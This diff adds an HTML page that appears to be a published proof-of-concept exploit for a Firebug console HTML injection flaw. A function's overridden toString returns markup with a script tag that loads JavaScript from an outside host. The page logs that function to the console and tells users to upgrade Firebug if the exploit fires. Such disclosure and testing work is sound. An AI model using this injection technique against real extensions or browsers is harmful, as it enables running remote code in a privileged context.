@@ -1,0 +1,43 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Firebug console HTML injection&lt;/title&gt;
+&lt;style&gt;
+noscript, .nofirebug{ color: red }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;h1&gt;Firebug console HTML injection&lt;/h1&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+// A function that returns a specially formatted string
+function vulnstring(){
+	return &#039;function &lt;b style=&quot;font-size:80px&quot;&gt;foo(&lt;script 
+src=&quot;http://larholm.com/vuln/firebuginclude.js&quot;&gt;&lt;/&#039;+&#039;script&gt;) { }&#039;;
+}
+// The function object to log with Firebug
+var a = function(){};
+// Overwrite the default toString method
+a.toString = vulnstring;
+
+// Attempt to trigger the vulnerability if Firebug is installed and has 
+console logging enabled
+if(typeof console!=&quot;undefined&quot; &amp;&amp; typeof console.log==&quot;function&quot;){
+	console.log(a);
+	document.write(&#039;&lt;p&gt;Check your Firebug console output. If it says 
+Foo() in very large letters and you get an alert then you are vulnerable 
+and should upgrade to Firebug v1.0.4 or greater.&lt;/p&gt;&#039;);
+} else { // Show error
+	document.write(&#039;&lt;p class=&quot;nofirebug&quot;&gt;This proof of concept 
+exploit requires Firebug to work&lt;/p&gt;&#039;);
+}
+
+&lt;/script&gt;
+
+&lt;noscript&gt;&lt;p&gt;This proof of concept exploit requires that Javascript is 
+enabled.&lt;/p&gt;&lt;/noscript&gt;
+
+&lt;h3&gt;Cheers, &lt;a href=&quot;http://larholm.com/&quot;&gt;Thor Larholm&lt;/a&gt;&lt;/h3&gt;
+
+
+&lt;/body&gt;&lt;/html&gt;
